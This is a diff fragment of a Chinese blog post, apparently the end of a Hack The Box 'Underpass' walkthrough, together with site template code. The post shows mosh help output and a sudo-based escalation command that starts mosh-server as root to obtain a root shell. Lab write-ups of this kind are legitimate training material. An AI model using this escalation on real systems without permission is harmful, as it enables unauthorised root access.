+<figure class="code-block"><figcaption><span>bash</span><button class="icon-text-button" type="button" data-copy-code aria-label="复制代码"><svg class="icon" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg><span>复制</span></button></figcaption><pre><code class="hljs language-bash">svcMosh@underpass:~$ /usr/bin/mosh-server
 
-<p>启动一个mosh-server服务，大致也是客户端和服务端</p>
-<p>通过–help查看连接命令</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">svcMosh@underpass:~$ mosh -h</span><br><span class="line">Usage: /usr/bin/mosh [options] [--] [user@]host [<span class="built_in">command</span>...]</span><br><span class="line">        --client=PATH        mosh client on <span class="built_in">local</span> machine</span><br><span class="line">                                (default: <span class="string">&quot;mosh-client&quot;</span>)</span><br><span class="line">        --server=COMMAND     mosh server on remote machine</span><br><span class="line">                                (default: <span class="string">&quot;mosh-server&quot;</span>)</span><br><span class="line"></span><br><span class="line">        --predict=adaptive      <span class="built_in">local</span> <span class="built_in">echo</span> <span class="keyword">for</span> slower links [default]</span><br><span class="line">-a      --predict=always        use <span class="built_in">local</span> <span class="built_in">echo</span> even on fast links</span><br><span class="line">-n      --predict=never         never use <span class="built_in">local</span> <span class="built_in">echo</span></span><br><span class="line">        --predict=experimental  aggressively <span class="built_in">echo</span> even when incorrect</span><br><span class="line"></span><br><span class="line">-4      --family=inet        use IPv4 only</span><br><span class="line">-6      --family=inet6       use IPv6 only</span><br><span class="line">        --family=auto        autodetect network <span class="built_in">type</span> <span class="keyword">for</span> single-family hosts only</span><br><span class="line">        --family=all         try all network types</span><br><span class="line">        --family=prefer-inet use all network types, but try IPv4 first [default]</span><br><span class="line">        --family=prefer-inet6 use all network types, but try IPv6 first</span><br><span class="line">-p PORT[:PORT2]</span><br><span class="line">        --port=PORT[:PORT2]  server-side UDP port or range</span><br><span class="line">                                (No effect on server-side SSH port)</span><br><span class="line">        --bind-server=&#123;ssh|any|IP&#125;  ask the server to reply from an IP address</span><br><span class="line">                                       (default: <span class="string">&quot;ssh&quot;</span>)</span><br><span class="line"></span><br><span class="line">        --ssh=COMMAND        ssh <span class="built_in">command</span> to run when setting up session</span><br><span class="line">                                (example: <span class="string">&quot;ssh -p 2222&quot;</span>)</span><br><span class="line">                                (default: <span class="string">&quot;ssh&quot;</span>)</span><br><span class="line"></span><br><span class="line">        --no-ssh-pty         <span class="keyword">do</span> not allocate a pseudo <span class="built_in">tty</span> on ssh connection</span><br><span class="line"></span><br><span class="line">        --no-init            <span class="keyword">do</span> not send terminal initialization string</span><br><span class="line"></span><br><span class="line">        --<span class="built_in">local</span>              run mosh-server locally without using ssh</span><br><span class="line"></span><br><span class="line">        --experimental-remote-ip=(<span class="built_in">local</span>|remote|proxy)  <span class="keyword">select</span> the method <span class="keyword">for</span></span><br><span class="line">                             discovering the remote IP address to use <span class="keyword">for</span> mosh</span><br><span class="line">                             (default: <span class="string">&quot;proxy&quot;</span>)</span><br><span class="line"></span><br><span class="line">        --<span class="built_in">help</span>               this message</span><br><span class="line">        --version            version and copyright information</span><br><span class="line"></span><br><span class="line">Please report bugs to mosh-devel@mit.edu.</span><br><span class="line">Mosh home page: https://mosh.org</span><br></pre></td></tr></table></figure>
 
-<p>直接</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mosh --server=&quot;sudo /usr/bin/mosh-server&quot; 127.0.0.1</span><br></pre></td></tr></table></figure>
+MOSH CONNECT 60001 DiiNVEgq4M56rujxrqcQBA
 
-<p>直接弹出一个ssh登录选项 进入root</p>
-<p><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250323141308086.png" alt="image-20250323141308086"></p>
-<p><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250323141402530.png" alt="image-20250323141402530"></p>
-</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://xyaxxya.github.io">yiyi</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://xyaxxya.github.io/posts/f5701a7f.html">https://xyaxxya.github.io/posts/f5701a7f.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://xyaxxya.github.io" target="_blank">Yiyi</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%B8%97%E9%80%8F/">渗透</a><a class="post-meta__tags" href="/tags/HTB/">HTB</a></div><div class="post_share"><div class="social-share" data-image="https://www.dmoe.cc/random.php?4350" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/72ffed1e.html" title="HTB-Cypher"><img class="cover" src="https://www.dmoe.cc/random.php?7280" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">HTB-Cypher</div></div></a></div><div class="next-post pull-right"><a href="/posts/92e7967d.html" title="HTB-Administrator"><img class="cover" src="https://www.dmoe.cc/random.php?4645" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">HTB-Administrator</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/posts/92e7967d.html" title="HTB-Administrator"><img class="cover" src="https://www.dmoe.cc/random.php?4645" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-03-22</div><div class="title">HTB-Administrator</div></div></a></div><div><a href="/posts/72ffed1e.html" title="HTB-Cypher"><img class="cover" src="https://www.dmoe.cc/random.php?7280" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-03-23</div><div class="title">HTB-Cypher</div></div></a></div><div><a href="/posts/4bdc74c4.html" title="HTB-Dog"><img class="cover" src="https://www.dmoe.cc/random.php?8208" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-03-24</div><div class="title">HTB-Dog</div></div></a></div><div><a href="/posts/fc0e5af.html" title="HTB-EscapeTwo"><img class="cover" src="https://www.dmoe.cc/random.php?1806" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-03-24</div><div class="title">HTB-EscapeTwo</div></div></a></div><div><a href="/posts/d681991e.html" title="HTB-LinkVortex"><img class="cover" src="https://www.dmoe.cc/random.php?667" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-03-21</div><div class="title">HTB-LinkVortex</div></div></a></div><div><a href="/posts/8cc5a836.html" title="HMVM-MS02423"><img class="cover" src="https://www.dmoe.cc/random.php?2667" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-02-11</div><div class="title">HMVM-MS02423</div></div></a></div></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://s2.loli.net/2024/02/16/Ixe9Cyq2mFBj74T.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">yiyi</div><div class="author-info__description">春风得意马蹄疾，一日看尽长安花</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">39</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">69</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xyaxxya"><i class="fab fa-github"></i><span>关注捏</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/xyaxxya" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="/3170234809@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a><a class="social-icon" href="https://blog.csdn.net/xydsg" target="_blank" title="CSDN"><i class="fa fa-book-open"></i></a><a class="social-icon" href="http://wpa.qq.com/msgrd?v=3&amp;uin=3170234809&amp;site=qq&amp;menu=yes" target="_blank" title="QQ"><i class="fab fa-qq"></i></a><a class="social-icon" href="http://wpa.qq.com/msgrd?v=3&amp;uin=3170234809&amp;site=qq&amp;menu=yes" target="_blank" title="Email"><i class="fas fa-envelope-open-text"></i></a><a class="social-icon" href="https://xyaxxya.github.io/2023/09/23/about-me/" target="_blank" title="wechat"><i class="fab fa-weixin"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">慢慢来，比较快</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/942cb43a.html" title="HMVM-Poppins"><img src="https://www.dmoe.cc/random.php?8829" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="HMVM-Poppins"/></a><div class="content"><a class="title" href="/posts/942cb43a.html" title="HMVM-Poppins">HMVM-Poppins</a><time datetime="2026-02-12T04:39:15.000Z" title="发表于 2026-02-12 12:39:15">2026-02-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/8cc5a836.html" title="HMVM-MS02423"><img src="https://www.dmoe.cc/random.php?2667" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="HMVM-MS02423"/></a><div class="content"><a class="title" href="/posts/8cc5a836.html" title="HMVM-MS02423">HMVM-MS02423</a><time datetime="2026-02-11T04:57:11.000Z" title="发表于 2026-02-11 12:57:11">2026-02-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/3d3db288.html" title="HMVM-Coolpg"><img src="https://www.dmoe.cc/random.php?6586" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="HMVM-Coolpg"/></a><div class="content"><a class="title" href="/posts/3d3db288.html" title="HMVM-Coolpg">HMVM-Coolpg</a><time datetime="2026-02-10T03:48:19.000Z" title="发表于 2026-02-10 11:48:19">2026-02-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/caa2ab8d.html" title="第十八届软件系统安全赛半决赛取证DC"><img src="https://www.dmoe.cc/random.php?4515" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="第十八届软件系统安全赛半决赛取证DC"/></a><div class="content"><a class="title" href="/posts/caa2ab8d.html" title="第十八届软件系统安全赛半决赛取证DC">第十八届软件系统安全赛半决赛取证DC</a><time datetime="2026-02-08T05:11:41.000Z" title="发表于 2026-02-08 13:11:41">2026-02-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/1f59513d.html" title="2025年度总结"><img src="https://www.dmoe.cc/random.php?2980" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2025年度总结"/></a><div class="content"><a class="title" href="/posts/1f59513d.html" title="2025年度总结">2025年度总结</a><time datetime="2026-01-12T13:55:08.000Z" title="发表于 2026-01-12 21:55:08">2026-01-12</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2024 - 2026 By yiyi</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">欢迎常来喵~</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.12.0"></script><script src="/js/main.js?v=4.12.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>(() => {
-  const initValine = () => {
-    const valine = new Valine(Object.assign({
-      el: '#vcomment',
-      appId: 'pYgEIy3e8aneCT2SHN7sYl1L-gzGzoHsz',
-      appKey: 'V8vEx9nsiDEMy45ekCcPUaiN',
-      avatar: 'monsterid',
-      serverURLs: 'https://pygeiy3e.lc-cn-n1-shared.com',
-      emojiMaps: "",
-      path: window.location.pathname,
-      visitor: true
-    }, null))
-  }
+mosh-server (mosh 1.3.2) [build mosh 1.3.2]
+Copyright 2012 Keith Winstein &lt;mosh-devel@mit.edu&gt;
+License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;.
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.
 
-  const loadValine = async () => {
-    if (typeof Valine === 'function') initValine()
-    else {
-      await getScript('https://cdn.jsdelivr.net/npm/valine@1.5.1/dist/Valine.min.js')
-      initValine()
-    }
-  }
+[mosh-server detached, pid = 1580]</code></pre></figure><p>启动一个mosh-server服务，大致也是客户端和服务端</p>
+<p>通过--help查看连接命令</p>
+<figure class="code-block"><figcaption><span>bash</span><button class="icon-text-button" type="button" data-copy-code aria-label="复制代码"><svg class="icon" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg><span>复制</span></button></figcaption><pre><code class="hljs language-bash">svcMosh@underpass:~$ mosh -h
+Usage: /usr/bin/mosh [options] [--] [user@]host [<span class="hljs-built_in">command</span>...]
+        --client=PATH        mosh client on <span class="hljs-built_in">local</span> machine
+                                (default: <span class="hljs-string">&quot;mosh-client&quot;</span>)
+        --server=COMMAND     mosh server on remote machine
+                                (default: <span class="hljs-string">&quot;mosh-server&quot;</span>)
 
-  if ('Valine' === 'Valine' || !false) {
-    if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
-    else setTimeout(loadValine, 0)
-  } else {
-    window.loadOtherComment = loadValine
-  }
-})()</script></div><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="true" data-click="false"></script><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
-POWERMODE.shake = true;
-POWERMODE.mobile = true;
-document.body.addEventListener('input', POWERMODE);
-</script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/click-heart.min.js" async="async" mobile="true"></script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/click-show-text.min.js" data-mobile="false" data-text="❤️,🩷,🧡,💛,💚,💙,🩵,💜,🤎,🖤,🩶,🤍" data-fontsize="15px" data-random="random" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.12.0"></script></div></div></body></html>
+        --predict=adaptive      <span class="hljs-built_in">local</span> <span class="hljs-built_in">echo</span> <span class="hljs-keyword">for</span> slower links [default]
+-a      --predict=always        use <span class="hljs-built_in">local</span> <span class="hljs-built_in">echo</span> even on fast links
+-n      --predict=never         never use <span class="hljs-built_in">local</span> <span class="hljs-built_in">echo</span>
+        --predict=experimental  aggressively <span class="hljs-built_in">echo</span> even when incorrect
+
+-4      --family=inet        use IPv4 only
+-6      --family=inet6       use IPv6 only
+        --family=auto        autodetect network <span class="hljs-built_in">type</span> <span class="hljs-keyword">for</span> single-family hosts only
+        --family=all         try all network types
+        --family=prefer-inet use all network types, but try IPv4 first [default]
+        --family=prefer-inet6 use all network types, but try IPv6 first
+-p PORT[:PORT2]
+        --port=PORT[:PORT2]  server-side UDP port or range
+                                (No effect on server-side SSH port)
+        --bind-server={ssh|any|IP}  ask the server to reply from an IP address
+                                       (default: <span class="hljs-string">&quot;ssh&quot;</span>)
+
+        --ssh=COMMAND        ssh <span class="hljs-built_in">command</span> to run when setting up session
+                                (example: <span class="hljs-string">&quot;ssh -p 2222&quot;</span>)
+                                (default: <span class="hljs-string">&quot;ssh&quot;</span>)
+
+        --no-ssh-pty         <span class="hljs-keyword">do</span> not allocate a pseudo <span class="hljs-built_in">tty</span> on ssh connection
+
+        --no-init            <span class="hljs-keyword">do</span> not send terminal initialization string
+
+        --<span class="hljs-built_in">local</span>              run mosh-server locally without using ssh
+
+        --experimental-remote-ip=(<span class="hljs-built_in">local</span>|remote|proxy)  <span class="hljs-keyword">select</span> the method <span class="hljs-keyword">for</span>
+                             discovering the remote IP address to use <span class="hljs-keyword">for</span> mosh
+                             (default: <span class="hljs-string">&quot;proxy&quot;</span>)
+
+        --<span class="hljs-built_in">help</span>               this message
+        --version            version and copyright information
+
+Please report bugs to mosh-devel@mit.edu.
+Mosh home page: https://mosh.org</code></pre></figure><p>直接</p>
+<figure class="code-block"><figcaption><span>text</span><button class="icon-text-button" type="button" data-copy-code aria-label="复制代码"><svg class="icon" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg><span>复制</span></button></figcaption><pre><code class="hljs language-text">mosh --server=&quot;sudo /usr/bin/mosh-server&quot; 127.0.0.1</code></pre></figure><p>直接弹出一个ssh登录选项 进入root</p>
+<p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250323141308086.png" alt="image-20250323141308086" loading="lazy" decoding="async"></figure></p>
+<p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250323141402530.png" alt="image-20250323141402530" loading="lazy" decoding="async"></figure></p>
+</article>
+        <aside class="toc-column"><nav class="post-toc" aria-label="文章目录" ><span>目录</span><div data-toc-list><p>本文没有分节</p></div></nav></aside>
+      </div>
+      <div class="post-tools section-shell">
+        <button type="button" data-copy-link><svg class="icon" width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M9 17H7A5 5 0 0 1 7 7h2"></path><path d="M15 7h2a5 5 0 1 1 0 10h-2"></path><line x1="8" x2="16" y1="12" y2="12"></line></svg><span>复制链接</span></button>
+        <a href="/archives/"><svg class="icon" width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M8 5h13"></path><path d="M13 12h8"></path><path d="M13 19h8"></path><path d="M3 10a2 2 0 0 0 2 2h3"></path><path d="M3 5v12a2 2 0 0 0 2 2h3"></path></svg><span>查看归档</span></a>
+      </div>
+      <nav class="post-pagination section-shell" aria-label="文章翻页">
+        <a href="/posts/92e7967d.html"><span><svg class="icon" width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="m12 19-7-7 7-7"></path><path d="M19 12H5"></path></svg>上一篇</span><strong>HTB-Administrator</strong></a>
+        <a class="post-next" href="/posts/72ffed1e.html"><span>下一篇<svg class="icon" width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M5 12h14"></path><path d="m12 5 7 7-7 7"></path></svg></span><strong>HTB-Cypher</strong></a>
+      </nav>
+      <section class="related-posts section-shell"><header><span>Related</span><h2>同专题继续阅读</h2></header><div>
+    <a href="/posts/942cb43a.html"><span>2026/02/12</span><strong>HMVM-Poppins</strong><svg class="icon" width="19" height="19" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M7 7h10v10"></path><path d="M7 17 17 7"></path></svg></a>
+    <a href="/posts/8cc5a836.html"><span>2026/02/11</span><strong>HMVM-MS02423</strong><svg class="icon" width="19" height="19" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M7 7h10v10"></path><path d="M7 17 17 7"></path></svg></a>
+    <a href="/posts/3d3db288.html"><span>2026/02/10</span><strong>HMVM-Coolpg</strong><svg class="icon" width="19" height="19" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M7 7h10v10"></path><path d="M7 17 17 7"></path></svg></a></div></section>
+    </main>
+    
+    
+    <footer class="site-footer">
+      <div class="footer-lead">
+        <a class="footer-brand" href="/">Yiyi</a>
+        <p>春风得意马蹄疾，一日看尽长安花<br><span>慢慢来，比较快</span></p>
+      </div>
+      <div class="footer-links">
+        <nav aria-label="页脚导航"><a class="" href="/#articles">文章</a><a class="" href="/categories/">专题</a><a class="" href="/tags/">标签</a><a class="" href="/archives/">归档</a><a class="" href="/about/">关于</a></nav>
+        <div class="footer-social">
+    <a href="https://github.com/xyaxxya" target="_blank" rel="noopener noreferrer"><svg class="icon" width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><circle cx="12" cy="18" r="3"></circle><circle cx="6" cy="6" r="3"></circle><circle cx="18" cy="6" r="3"></circle><path d="M18 9v2c0 .6-.4 1-1 1H7c-.6 0-1-.4-1-1V9"></path><path d="M12 12v3"></path></svg><span>GitHub</span></a>
+    <a href="https://blog.csdn.net/xydsg" target="_blank" rel="noopener noreferrer"><svg class="icon" width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M13.4 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-7.4"></path><path d="M2 6h4"></path><path d="M2 10h4"></path><path d="M2 14h4"></path><path d="M2 18h4"></path><path d="M21.378 5.626a1 1 0 1 0-3.004-3.004l-5.01 5.012a2 2 0 0 0-.506.854l-.837 2.87a.5.5 0 0 0 .62.62l2.87-.837a2 2 0 0 0 .854-.506z"></path></svg><span>CSDN</span></a>
+    <a href="mailto:3170234809@qq.com"><svg class="icon" width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="m22 7-8.991 5.727a2 2 0 0 1-2.009 0L2 7"></path><rect x="2" y="4" width="20" height="16" rx="2"></rect></svg><span>Email</span></a></div>
+      </div>
+      <div class="footer-bottom">
+        <span>© 2026 yiyi</span>
+        <span>春风正好，步履不停</span>
+      </div>
+    </footer>
+    
+    <div class="mobile-menu" data-mobile-menu aria-hidden="true">
+      <button class="mobile-menu-close" type="button" data-menu-close aria-label="关闭菜单"><svg class="icon" width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M18 6 6 18"></path><path d="m6 6 12 12"></path></svg></button>
+      <nav aria-label="移动导航"><a class="mobile-menu-link" href="/#articles">文章</a><a class="mobile-menu-link" href="/categories/">专题</a><a class="mobile-menu-link" href="/tags/">标签</a><a class="mobile-menu-link" href="/archives/">归档</a><a class="mobile-menu-link" href="/about/">关于</a></nav>
+      <div class="mobile-menu-social">
+    <a href="https://github.com/xyaxxya" aria-label="GitHub" target="_blank" rel="noopener noreferrer"><svg class="icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><circle cx="12" cy="18" r="3"></circle><circle cx="6" cy="6" r="3"></circle><circle cx="18" cy="6" r="3"></circle><path d="M18 9v2c0 .6-.4 1-1 1H7c-.6 0-1-.4-1-1V9"></path><path d="M12 12v3"></path></svg></a>
+    <a href="https://blog.csdn.net/xydsg" aria-label="CSDN" target="_blank" rel="noopener noreferrer"><svg class="icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M13.4 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-7.4"></path><path d="M2 6h4"></path><path d="M2 10h4"></path><path d="M2 14h4"></path><path d="M2 18h4"></path><path d="M21.378 5.626a1 1 0 1 0-3.004-3.004l-5.01 5.012a2 2 0 0 0-.506.854l-.837 2.87a.5.5 0 0 0 .62.62l2.87-.837a2 2 0 0 0 .854-.506z"></path></svg></a>
+    <a href="mailto:3170234809@qq.com" aria-label="Email"><svg class="icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="m22 7-8.991 5.727a2 2 0 0 1-2.009 0L2 7"></path><rect x="2" y="4" width="20" height="16" rx="2"></rect></svg></a></div>
+    </div>
+    
+    <dialog class="search-dialog" data-search-dialog>
+      <div class="search-shell">
+        <header class="search-header">
+          <span class="search-title">站内搜索</span>
+          <button class="icon-button" type="button" data-close-search aria-label="关闭搜索"><svg class="icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M18 6 6 18"></path><path d="m6 6 12 12"></path></svg></button>
+        </header>
+        <label class="search-field">
+          <svg class="icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="m21 21-4.34-4.34"></path><circle cx="11" cy="11" r="8"></circle></svg>
+          <input type="search" data-search-input autocomplete="off" placeholder="搜索标题、标签或正文" aria-label="搜索文章">
+        </label>
+        <p class="search-status" data-search-status>输入关键词，查找 39 篇记录。</p>
+        <div class="search-results" data-search-results aria-live="polite"></div>
